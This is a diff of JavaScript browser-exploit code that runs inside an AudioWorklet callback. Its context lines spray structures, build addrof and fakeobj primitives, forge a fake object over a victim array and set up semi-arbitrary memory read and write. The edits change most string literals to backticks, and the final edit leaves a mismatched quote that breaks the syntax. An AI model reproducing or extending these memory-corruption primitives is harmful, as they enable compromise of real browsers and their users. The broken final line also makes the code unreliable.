@@ -682,7 +682,7 @@ b.process = (inputs, outputs, parameters)=>{
     }
     else if(stage=="gc_test"){
         gc();
-        fuck.port.postMessage("Garbage Collected");
+        fuck.port.postMessage(`Garbage Collected`);
         //sleep(100000);
         stage = "wasmfaker";
         return true;
@@ -691,7 +691,7 @@ b.process = (inputs, outputs, parameters)=>{
     debugger;
     let fail = function fail(x)
     {
-        fuck.port.postMessage("FAIL: " + x);
+        fuck.port.postMessage(`FAIL: ` + x);
         location.reload();
         throw null;
     }
@@ -709,8 +709,8 @@ b.process = (inputs, outputs, parameters)=>{
    foo({});
    foo({x:0x4141414141});
 }
-        fuck.port.postMessage("starting")
-        print1("[*] Spraying structures to get a butterfly (1/2)...");
+        fuck.port.postMessage(`starting`)
+        print1(`[*] Spraying structures to get a butterfly (1/2)...`);
         //RIPPPPPPPPPP
         /*
         // copy paste from: 
@@ -972,7 +972,7 @@ b.process = (inputs, outputs, parameters)=>{
          // verify basic exploit primitives work.
     var addr = addrof({p: 0x1337});
     if(fakeobj(addr).p == 0x1337) {
-    print1("[+] exploit primitives working");
+    print1(`[+] exploit primitives working`);
     }
 
 
@@ -999,7 +999,7 @@ b.process = (inputs, outputs, parameters)=>{
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     var victim = structs[0x800];
-    print1("[+] victim @" + addrof(victim));
+    print1(`[+] victim @` + addrof(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
@@ -1010,7 +1010,7 @@ b.process = (inputs, outputs, parameters)=>{
 
     // create object having |victim| as butterfly.
     var containerAddr = addrof(container);
-    print1("[+] container @"+containerAddr);
+    print1(`[+] container @`+containerAddr);
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(Add(containerAddr, 0x10));
     // origButterfly is now based on the offset of **victim** 
@@ -1061,19 +1061,19 @@ b.process = (inputs, outputs, parameters)=>{
 
             var addr = this.addrof(obj);
             if(this.fakeobj(addr).p == v){
-                print1("addrof and/or fakeobj does not work");
+                print1(`addrof and/or fakeobj does not work`);
             }
 
             var propertyAddr = Add(addr, 0x10);
 
             var value = this.read64(propertyAddr);
             if(value.asDouble() == addrof(v).asDouble()) {
-                print1("read64 does not work");
+                print1(`read64 does not work`);
             }
 
             this.write16(propertyAddr, 0x1337);
             if(obj.p == 0x1337) {
-                print1("write16 does not work");
+                print1(`write16 does not work`);
             }
         },
     };
@@ -1083,7 +1083,7 @@ b.process = (inputs, outputs, parameters)=>{
     var header = memory.read64(addrof(plainObj));
     memory.writeInt64(memory.addrof(container), header);
     memory.test();
-    print1("[+] limited memory read/write working");
+    print1(`[+] semi - arbitrary memory read/write working");
         
         stage = "parsecache";
         return true;
